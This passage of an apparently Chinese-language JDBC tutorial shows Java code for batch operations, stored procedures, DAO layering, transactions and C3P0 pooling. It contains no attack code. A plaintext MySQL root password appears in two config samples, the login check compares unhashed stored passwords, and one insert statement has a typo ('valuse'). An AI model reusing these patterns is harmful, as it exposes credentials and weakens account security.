<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">batchDelete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Connection conn=<span class="keyword">null</span>;</span><br><span class="line">    PreparedStatement pre=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        conn=getConnection();</span><br><span class="line">        String sql=<span class="string">&quot;delete from users where username=?&quot;</span>;</span><br><span class="line">        pre=conn.prepareStatement(sql);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">100</span>; i++) &#123;</span><br><span class="line">            pre.setString(<span class="number">1</span>, <span class="string">&quot;name&quot;</span> + i);</span><br><span class="line">            pre.addBatch();</span><br><span class="line">        &#125;</span><br><span class="line">        pre.executeBatch();</span><br><span class="line">        System.out.println(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        closeAll(conn,pre,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="八、存储过程"><a href="#八、存储过程" class="headerlink" title="八、存储过程"></a>八、存储过程</h3><h4 id="prepareCall"><a href="#prepareCall" class="headerlink" title="prepareCall"></a>prepareCall</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testInOut</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;请输入部门编号&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> deptno=sc.nextInt();</span><br><span class="line">    Connection conn=<span class="keyword">null</span>;</span><br><span class="line">    CallableStatement c=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        conn=getConnection();</span><br><span class="line">        String sql=<span class="string">&quot;call sp_emp4(?,?)&quot;</span>;</span><br><span class="line">        c=conn.prepareCall(sql);</span><br><span class="line">        <span class="comment">//设置输入参数</span></span><br><span class="line">        c.setInt(<span class="number">1</span>,deptno);</span><br><span class="line">        <span class="comment">//设置输出参数</span></span><br><span class="line">        c.registerOutParameter(<span class="number">2</span>, Types.INTEGER);</span><br><span class="line"></span><br><span class="line">        c.executeQuery();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        closeAll(conn,c,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testIn</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;请输入部门编号&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> deptno=sc.nextInt();</span><br><span class="line">    Connection conn=<span class="keyword">null</span>;</span><br><span class="line">    CallableStatement c=<span class="keyword">null</span>;</span><br><span class="line">    ResultSet rs=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        conn=getConnection();</span><br><span class="line">        String sql=<span class="string">&quot;call sp_emp2(?)&quot;</span>;</span><br><span class="line">        c=conn.prepareCall(sql);</span><br><span class="line">        <span class="comment">//设置输入参数</span></span><br><span class="line">        c.setInt(<span class="number">1</span>,deptno);</span><br><span class="line">        <span class="comment">//发送参数</span></span><br><span class="line">        rs=c.executeQuery();</span><br><span class="line">        System.out.println(deptno+<span class="string">&quot;员工&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">            System.out.println(rs.getInt(<span class="number">1</span>)+rs.getString(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        closeAll(conn,c,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="九、jdbc分层"><a href="#九、jdbc分层" class="headerlink" title="九、jdbc分层"></a>九、jdbc分层</h3><h4 id="使用属性文件动态切换数据库"><a href="#使用属性文件动态切换数据库" class="headerlink" title="使用属性文件动态切换数据库"></a>使用属性文件动态切换数据库</h4><h5 id="配置文件propertise"><a href="#配置文件propertise" class="headerlink" title="配置文件propertise"></a>配置文件propertise</h5><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/emp</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">86795462m</span></span><br><span class="line"><span class="attr">driverClass</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<h5 id="使用statis代码块"><a href="#使用statis代码块" class="headerlink" title="使用statis代码块"></a>使用statis代码块</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String url = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String user = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String password = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String driverClass=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Properties properties=<span class="keyword">new</span> Properties();</span><br><span class="line">			InputStream in=JdbcUtil.class.getResourceAsStream(<span class="string">&quot;/jdbcEmp.properties&quot;</span>);</span><br><span class="line">			properties.load(in);</span><br><span class="line"></span><br><span class="line">			url=properties.getProperty(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">			user=properties.getProperty(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">			password=properties.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">			driverClass=properties.getProperty(<span class="string">&quot;driverClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">			Class.forName(driverClass);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1、创建工具类"><a href="#1、创建工具类" class="headerlink" title="1、创建工具类"></a>1、创建工具类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 建立连接</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 数据连接对象</span></span><br><span class="line">   Connection conn = <span class="keyword">null</span>;</span><br><span class="line">   <span class="comment">// 获取连接并捕获异常</span></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">      conn = DriverManager.getConnection(url, user, password);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();<span class="comment">// 异常处理</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 返回连接对象</span></span><br><span class="line">   <span class="keyword">return</span> conn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关闭资源</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> conn</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stmt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> rs</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">closeAll</span><span class="params">(Connection conn, Statement stmt, ResultSet rs)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 若结果集对象不为空，则关闭</span></span><br><span class="line">   <span class="keyword">if</span> (rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         rs.close();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 若Statement对象不为空，则关闭</span></span><br><span class="line">   <span class="keyword">if</span> (stmt != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         stmt.close();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 若数据库连接对象不为空，则关闭</span></span><br><span class="line">   <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         conn.close();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">executeUpdate</span><span class="params">(String sql, Object[] param)</span> </span>&#123;</span><br><span class="line">   Connection conn = getConnection();</span><br><span class="line">   <span class="comment">// 数据连接对象</span></span><br><span class="line">   PreparedStatement pstmt = <span class="keyword">null</span>;</span><br><span class="line">   <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      pstmt = conn.prepareStatement(sql);</span><br><span class="line">      <span class="keyword">if</span> (param != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; param.length; i++) &#123;</span><br><span class="line">            pstmt.setObject(i + <span class="number">1</span>, param[i]);</span><br><span class="line">            <span class="comment">// 为预编译sql设置参数</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      num = pstmt.executeUpdate();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      closeAll(conn, pstmt, <span class="keyword">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;insert into emp values (?,?,?,?,?,?,?,?)&quot;</span>;</span><br><span class="line">Object[] params=&#123;empno,ename,job,mgr,<span class="keyword">new</span> java.sql.Date(hiredate.getTime()),sal,comm,deptno&#125;;</span><br><span class="line"><span class="keyword">int</span> result=JdbcUtil.executeUpdate(sql,params);</span><br></pre></td></tr></table></figure>

<h5 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h5><p><img src="https://csn.damyoung.cn/image-20200908125204782.png" alt="image-20200908125204782"><img src="https://csn.damyoung.cn/image-20200908125225154.png" alt="image-20200908125225154"></p>
<h4 id="2、创建数据访问层"><a href="#2、创建数据访问层" class="headerlink" title="2、创建数据访问层"></a>2、创建数据访问层</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 连接User表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDao</span> <span class="keyword">extends</span> <span class="title">JdbcUtil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserByUsernameAndPassword</span><span class="params">(String username,String pwd)</span></span>&#123;</span><br><span class="line">        User user=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Connection conn=getConnection();</span><br><span class="line">            String sql=<span class="string">&quot;select *from user where username=? and password=?&quot;</span>;</span><br><span class="line">            PreparedStatement p=conn.prepareStatement(sql);</span><br><span class="line">            <span class="comment">//给通配符添加数据</span></span><br><span class="line">            p.setString(<span class="number">1</span>,username);</span><br><span class="line">            p.setString(<span class="number">2</span>,pwd);</span><br><span class="line">            <span class="comment">//将sql语句发送到数据库查询，并返回结果boolean</span></span><br><span class="line">            ResultSet r=p.executeQuery();</span><br><span class="line">            <span class="comment">//如果存在该用户</span></span><br><span class="line">            <span class="keyword">if</span> (r.next())&#123;</span><br><span class="line">                user=<span class="keyword">new</span> User(username,pwd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmpDao</span> <span class="keyword">extends</span> <span class="title">JdbcUtil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deleteEmp</span><span class="params">(<span class="keyword">int</span> empno)</span></span>&#123;</span><br><span class="line">        String sql=<span class="string">&quot;delete from emp where empno=?&quot;</span>;</span><br><span class="line">        Object[] params=&#123;empno&#125;;</span><br><span class="line">        <span class="keyword">return</span> executeUpdate(sql,params);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addEmp</span><span class="params">(Emp emp)</span></span>&#123;</span><br><span class="line">        String sql=<span class="string">&quot;insert into emp valuse(?,?,?,?,?,?,?,?)&quot;</span>;</span><br><span class="line">        Object[] params=&#123;emp.getEmpno(),emp.getEname(),emp.getJob(),emp.getMgr(),<span class="keyword">new</span> java.sql.Date(emp.getHiredate().getTime()),emp.getSal(),emp.getComm(),emp.getDeptno()&#125;;</span><br><span class="line">        <span class="keyword">return</span> executeUpdate(sql,params);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Emp&gt; <span class="title">selectAllEmps</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;Emp&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Connection conn=getConnection();</span><br><span class="line">            System.out.println(<span class="string">&quot;数据库连接成功&quot;</span>);</span><br><span class="line">            String sql=<span class="string">&quot;select *from emp&quot;</span>;</span><br><span class="line">            PreparedStatement p=conn.prepareStatement(sql);</span><br><span class="line">            ResultSet rs=p.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">                Emp emp=<span class="keyword">new</span> Emp();</span><br><span class="line">              	emp.setSal(rs.getInt(<span class="string">&quot;sal&quot;</span>));</span><br><span class="line">                emp.setComm(rs.getInt(<span class="string">&quot;comm&quot;</span>));</span><br><span class="line">                emp.setDeptno(rs.getInt(<span class="string">&quot;deptno&quot;</span>));</span><br><span class="line">                emp.setEmpno(rs.getInt(<span class="string">&quot;empno&quot;</span>));</span><br><span class="line">                emp.setEname(rs.getString(<span class="string">&quot;ename&quot;</span>));</span><br><span class="line">                emp.setHiredate(rs.getDate(<span class="string">&quot;hiredate&quot;</span>));</span><br><span class="line">                emp.setMgr(rs.getInt(<span class="string">&quot;mgr&quot;</span>));</span><br><span class="line">                emp.setJob(rs.getString(<span class="string">&quot;job&quot;</span>));</span><br><span class="line">                list.add(emp);</span><br><span class="line">            &#125;</span><br><span class="line">            closeAll(conn,p,rs);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、创建视图层"><a href="#3、创建视图层" class="headerlink" title="3、创建视图层"></a>3、创建视图层</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//表示层</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入用户名&quot;</span>);</span><br><span class="line">        String username=sc.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入密码&quot;</span>);</span><br><span class="line">        String pwd=sc.next();</span><br><span class="line"></span><br><span class="line">        UserDao userDao=<span class="keyword">new</span> UserDao();</span><br><span class="line">        User user=userDao.findUserByUsernameAndPassword(username,pwd);</span><br><span class="line">        <span class="keyword">if</span> (user!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有员工信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectAllEmps</span><span class="params">()</span></span>&#123;</span><br><span class="line">        EmpDao empDao=<span class="keyword">new</span> EmpDao();</span><br><span class="line">        List&lt;Emp&gt; list=empDao.selectAllEmps();</span><br><span class="line"><span class="comment">//        for (Emp e:list) &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addEmp</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">           System.out.println(<span class="string">&quot;编号&quot;</span>);</span><br><span class="line">           <span class="keyword">int</span> empno=sc.nextInt();</span><br><span class="line">           System.out.println(<span class="string">&quot;姓名&quot;</span>);</span><br><span class="line">           String ename=sc.next();</span><br><span class="line">           System.out.println(<span class="string">&quot;职位&quot;</span>);</span><br><span class="line">           String job=sc.next();</span><br><span class="line">           System.out.println(<span class="string">&quot;经理编号&quot;</span>);</span><br><span class="line">           <span class="keyword">int</span> mgr=sc.nextInt();</span><br><span class="line">           System.out.println(<span class="string">&quot;yyyy-mm-dd&quot;</span>);</span><br><span class="line">           String date=sc.next();</span><br><span class="line">           SimpleDateFormat dateFormat=<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">           Date hiredate=dateFormat.parse(date);</span><br><span class="line">           System.out.println(<span class="string">&quot;工资&quot;</span>);</span><br><span class="line">           <span class="keyword">double</span> sal=sc.nextDouble();</span><br><span class="line">           System.out.println(<span class="string">&quot;奖金&quot;</span>);</span><br><span class="line">           <span class="keyword">double</span> comm=sc.nextDouble();</span><br><span class="line">           System.out.println(<span class="string">&quot;部门编号&quot;</span>);</span><br><span class="line">           <span class="keyword">int</span> deptno=sc.nextInt();</span><br><span class="line">           Emp emp=<span class="keyword">new</span> Emp(empno,ename,job,mgr,hiredate,sal,comm,deptno);</span><br><span class="line"></span><br><span class="line">           EmpDao empDao=<span class="keyword">new</span> EmpDao();</span><br><span class="line">           <span class="keyword">int</span> result=empDao.addEmp(emp);</span><br><span class="line">           <span class="keyword">if</span> (result&gt;<span class="number">0</span>)&#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;添加成功&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deletEmp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入员工编号&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> empno=sc.nextInt();</span><br><span class="line">        EmpDao empDao=<span class="keyword">new</span> EmpDao();</span><br><span class="line">        <span class="keyword">int</span> result =empDao.deleteEmp(empno);</span><br><span class="line">        <span class="keyword">if</span> (result&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;删除成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="十、事务"><a href="#十、事务" class="headerlink" title="十、事务"></a>十、事务</h3><p>connection.setAutoCommit(false) 默认true，自动提交</p>
<p>connection.commit() 提交事务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">            conn=getConnection();</span><br><span class="line">            <span class="comment">//设置提交方式</span></span><br><span class="line">            conn.setAutoCommit(<span class="keyword">false</span>);</span><br><span class="line">            String delSql=<span class="string">&quot;update account set balance=balance-500 where name=&#x27;张三&#x27;&quot;</span>;</span><br><span class="line">            String addSql=<span class="string">&quot;update account set balance=balance+500 where name=&#x27;李四&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            stmt=conn.prepareStatement(delSql);</span><br><span class="line">            stmt.executeUpdate();</span><br><span class="line"></span><br><span class="line"><span class="comment">//            int i=100/0;</span></span><br><span class="line">            stmt=conn.prepareStatement(addSql);</span><br><span class="line">            stmt.executeUpdate();</span><br><span class="line"></span><br><span class="line">            conn.commit();</span><br><span class="line">            System.out.println(<span class="string">&quot;转账成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">assert</span> conn != <span class="keyword">null</span>;</span><br><span class="line">                conn.rollback();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e1)&#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h2 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h2><p>创建一个连接池，每次需要的的时候从连接池获取连接，减少每次用户都要从服务器获取连接，效率低</p>
<p>使用<code>DataSource</code>接口</p>
<h3 id="1、C3P0"><a href="#1、C3P0" class="headerlink" title="1、C3P0"></a>1、C3P0</h3><p>导入c3p0-0.9.1.2.jar包</p>
<p><strong>配置文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">c3p0-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用默认的配置读取连接池对象 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--mysql数据库连接的各项参数--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/myabl?useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf8<span class="symbol">&amp;amp;</span>serverTimezone=GMT%2B8<span class="symbol">&amp;amp;</span>useSSL=false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>86795462m<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置数据库连接池的初始连接数、最小链接数、获取连接数、最大连接数、最大空闲时间--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minPoolSize&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;acquireIncrement&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxIdleTime&quot;</span>&gt;</span>30<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">default-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用mysql的配置读取连接池对象 --&gt;</span></span><br><span class="line"></span><br><span class="line">    -<span class="tag">&lt;<span class="name">named-config</span> <span class="attr">name</span>=<span class="string">&quot;mysql&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 设置字符集和时区 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:mysql://127.0.0.1:3306/emp<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 初始化连接池中的连接数，取值应在minPoolSize与maxPoolSize之间，默认为3--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>6<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--最大空闲时间，超过该秒数未使用则连接被丢弃。若为0则永不丢弃。默认值: 0 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxIdleTime&quot;</span>&gt;</span>20<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--连接池中保留的最大连接数。默认值: 15 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>20<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span 